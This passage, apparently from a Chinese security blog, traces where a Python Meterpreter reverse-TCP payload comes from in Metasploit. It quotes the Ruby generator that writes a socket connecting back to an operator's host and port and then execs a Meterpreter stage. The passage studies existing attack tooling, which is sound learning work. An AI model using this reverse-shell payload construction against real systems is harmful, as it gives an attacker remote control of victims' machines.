## **payload的由来**

当然，我们需要理解他是如何得到这个payload的。

在**/usr/share/metasploit-framework/modules/payloads/singles/python**目录中可以看见他的模块

![](../Images/9abb3334e2329c67d6e59f6f6c868ae7.png)

我们看一下**meterpreter\_reverse\_tcp**这个模块

![](../Images/f94989c382f1a11d2295ec040b044ed6.png)

ruby不是很懂，只能大概的理解一下意思，这段为生成payload的代码

```
def generate\_reverse\_tcp(opts={})
    socket\_setup  = "s = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)\\n"
    socket\_setup << "s.connect(('#{opts\[:host\]}',#{opts\[:port\]}))\\n"
    opts\[:stageless\_tcp\_socket\_setup\] = socket\_setup
 
    met = stage\_meterpreter(opts)
    py\_create\_exec\_stub(met)
```

在看一眼上面的代码，就很明显的明白了。
